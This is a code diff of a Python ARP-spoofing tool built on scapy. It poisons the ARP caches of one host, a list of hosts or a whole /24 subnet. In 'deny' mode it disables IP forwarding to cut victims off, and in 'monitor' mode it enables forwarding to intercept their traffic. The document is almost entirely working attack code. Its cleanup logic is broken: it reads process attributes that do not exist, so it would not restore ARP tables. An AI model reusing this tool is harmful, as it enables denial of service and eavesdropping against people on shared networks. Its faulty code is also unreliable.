@@ -5,7 +5,7 @@ import scapy.all as scapy
 import argparse
 import sys
 import multiprocessing as mp
-
+import subprocess
 # import pyfiglet
 # ascii_banner = pyfiglet.figlet_format("Network Hacker",font="banner3-D")
 # print(ascii_banner)
@@ -31,9 +31,6 @@ def get_arguments():
         parser.error("[-] Please specify a gateway IP, use --help for more info.")
     return options
 
-option = get_arguments()
-processes = []
-
 def get_mac(ip):
     try:
         arp_request = scapy.ARP(pdst=ip)
@@ -43,7 +40,7 @@ def get_mac(ip):
         return answered_list[0][1].hwsrc
     except IndexError:
         print("[-] Could not get MAC address for " + ip + ". Exiting.")
-        sys.exit(1)
+        return 0
 
 
 def spoof_arp_table(victim_ip, victim_mac, false_requester_ip):
@@ -81,55 +78,90 @@ def start_attack(target_ip, gateway_ip):
     print("[+] Attacking " + target_ip)
     target_mac = get_mac(target_ip)
     gateway_mac = get_mac(gateway_ip)
+    if target_mac == 0 or gateway_mac == 0:
+        print("[-] Could not get MAC address of target "+target_ip+" or gateway. Exiting.")
+        return
     count = 0
-    try:
-        while True:
-            print("\n[+] Spoofing ARP table of " + target_ip + " to " + gateway_ip)
-            spoof_arp_table(target_ip, target_mac, gateway_ip)
-            spoof_arp_table(gateway_ip, gateway_mac, target_ip)
-            count += 1
-            if option.all:
-                print("\r[+] All Devices in "+ gateway_ip+ "/24 Network are being " + (" Denied " if option.mode == 'd' else " Monitored ") +  " for " + str(count) + " seconds", end="")
-            elif option.list_ip:
-                print("\r[+] All Devices in "+ option.list_ip+ " are being " + (" Denied " if option.mode == 'd' else " Monitored ") +  " for " + str(count) + " seconds", end="")
-            else:
-                print("\r[+]" + " Traffic of "+ target_ip + " has been "+(" Denied " if option.mode == 'd' else " Monitored ") +  " for " + str(count) + " seconds", end="")
-            time.sleep(1)
+    while True:
+        print("\n[+] Spoofing ARP table of " + target_ip + " to " + gateway_ip)
+        spoof_arp_table(target_ip, target_mac, gateway_ip)
+        spoof_arp_table(gateway_ip, gateway_mac, target_ip)
+        count += 1
+        print("\r[+] Packets sent: " + str(count), end="")
+        time.sleep(1)
 
+
+# if option.all:
+#     print("\r[+] All Devices in " + gateway_ip + "/24 Network are being " + (
+#         " Denied " if option.mode == 'd' else " Monitored ") + " for " + str(count) + " seconds", end="")
+# elif option.list_ip:
+#     print("\r[+] All Devices in " + option.list_ip + " are being " + (
+#         " Denied " if option.mode == 'd' else " Monitored ") + " for " + str(count) + " seconds", end="")
+# else:
+#     print("\r[+]" + " Traffic of " + target_ip + " has been " + (
+#         " Denied " if option.mode == 'd' else " Monitored ") + " for " + str(count) + " seconds", end="")
+
+if __name__ == "__main__":
+    start = time.time()
+    option = get_arguments()
+    processes = []
+    print("\n[+][+]\t\tWelcome to Network Controller\t\t[+][+]\n")
+    if option.mode == 'd':
+        subprocess.call("sudo echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
+        print("[+] Starting ARP Spoofing Attack in Deny Mode")
+    else:
+        subprocess.call("sudo echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
+        print("[+] Starting ARP Spoofing Attack in Monitor Mode")
+    try:
+        if option.all:
+            print("[+] Scanning Network...")
+            answered = scan_network(option.gateway_ip + "/24", option.timeout)
+            print("[+] Found " + str(len(answered)) + " devices in the network.")
+            for i in range(len(answered)):
+                p = mp.Process(target=start_attack, args=(answered[i][1].psrc, option.gateway_ip))
+                p.start()
+                processes.append(p)
+        elif option.list_ip:
+            for i in range(len(option.list_ip)):
+                p = mp.Process(target=start_attack, args=(option.list_ip[i], option.gateway_ip))
+                p.start()
+                processes.append(p)
+        else:
+            p = mp.Process(target=start_attack, args=(option.target_ip, option.gateway_ip))
+            p.start()
+            processes.append(p)
+        for p in processes:
+            p.join()
     except KeyboardInterrupt:
         print("\n[+] Detected CTRL + C ...... Resetting ARP Tables ...... Please wait.")
         if len(processes) > 0:
-            for index, thread in enumerate(processes):
+            for index, process in enumerate(processes):
                 logging.info("Main    : before joining thread %d.", index)
-                thread.join()
+                print("Stopping Thread " + str(process))
+                restore_arp_table(process.target_ip, process.target_mac, process.gateway_ip, process.gateway_mac)
+                restore_arp_table(process.gateway_ip, process.gateway_mac, process.target_ip, process.target_mac)
+                process.join()
                 logging.info("Main    : thread %d done", index)
-        restore_arp_table(target_ip, target_mac, gateway_ip, gateway_mac)
-        restore_arp_table(gateway_ip, gateway_mac, target_ip, target_mac)
         print("[+] ARP Tables Reset Successfully")
+    # if option.all:
+    #     print("[+] Spoofing all devices in the network")
+    #     print("[+] Scanning network for devices")
+    #     res = scan_network(option.gateway_ip + "/24", option.timeout)
+    #     print("[+] Found " + str(len(res)) + " devices")
+    #     for i in res:
+    #         x = mp.Process(target=start_attack, args=(i[1].psrc, option.gateway_ip))
+    #         x.start()
+    #         processes.append(x)
+    #
+    # elif option.list_ip:
+    #     print("[+] Spoofing devices " + str(option.list_ip))
+    #     for i in option.list_ip:
+    #         pass
+    #         # start_attack(i, option.gateway_ip)
+    #
+    # else:
+    #     pass
+    #     start_attack(option.target_ip, option.gateway_ip)
 
-
-print("\n[+][+]\t\tWelcome to Network Controller\t\t[+][+]\n")
-if option.mode == 'd':
-    print("[+] Starting ARP Spoofing Attack in Deny Mode")
-else:
-    print("[+] Starting ARP Spoofing Attack in Monitor Mode")
-
-if option.all:
-    print("[+] Spoofing all devices in the network")
-    print("[+] Scanning network for devices")
-    res = scan_network(option.gateway_ip + "/24", option.timeout)
-    print("[+] Found " + str(len(res)) + " devices")
-    for i in res:
-        x = mp.Process(target=start_attack, args=(i[1].psrc, option.gateway_ip))
-        x.start()
-        processes.append(x)
-
-elif option.list_ip:
-    print("[+] Spoofing devices " + str(option.list_ip))
-    for i in option.list_ip:
-        pass
-        # start_attack(i, option.gateway_ip)
-
-else:
-    pass
-    start_attack(option.target_ip, option.gateway_ip)
+    end = time.time()
+    print('Time taken in seconds -', end - start)
